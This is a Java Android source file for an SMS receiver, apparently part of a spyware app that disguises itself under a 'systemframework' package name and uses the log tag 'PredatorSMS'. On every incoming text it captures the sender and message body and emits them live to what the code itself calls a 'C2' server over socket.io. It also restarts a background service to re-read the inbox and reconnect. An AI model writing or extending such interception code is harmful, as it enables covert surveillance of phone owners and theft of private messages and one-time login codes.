package com.example.systemframework;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import io.socket.client.Socket;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "PredatorSMS";

    // ✅ FIX: volatile ensures all threads see the latest socket reference
    private static volatile Socket mSocket;

    public static void setSocket(Socket socket) {
        mSocket = socket;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            return;
        }

        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            String format = bundle.getString("format");

            if (pdus != null) {
                for (Object pdu : pdus) {
                    try {
                        SmsMessage sms;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                        } else {
                            sms = SmsMessage.createFromPdu((byte[]) pdu);
                        }

                        String sender = sms.getOriginatingAddress();
                        String message = sms.getMessageBody();

                        Log.d(TAG, "📩 SMS from " + sender);

                        // ✅ STEP 1: If socket is online, send immediately
                        Socket currentSocket = mSocket; // Local copy for thread safety
                        if (currentSocket != null && currentSocket.connected()) {
                            currentSocket.emit("phone_data", "⚡ [LIVE SMS] From " + sender + " -> " + message);
                            Log.d(TAG, "SMS sent to C2 via live socket");
                        } else {
                            Log.w(TAG, "Socket offline — SMS will be sent on reconnect");
                        }

                        // ✅ STEP 2: Trigger service to read inbox + reconnect if needed
                        MyBackgroundService serviceInstance = MyBackgroundService.getInstance();
                        if (serviceInstance != null) {
                            serviceInstance.readSMSInstant();
                        } else {
                            // Service is dead — restart it (it will auto-connect and sync)
                            Log.w(TAG, "Service dead — restarting to handle SMS");
                            Intent serviceIntent = new Intent(context, MyBackgroundService.class);
                            try {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    context.startForegroundService(serviceIntent);
                                } else {
                                    context.startService(serviceIntent);
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Failed to restart service: " + e.getMessage());
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing SMS PDU: " + e.getMessage());
                    }
                }
            }
        }
    }
}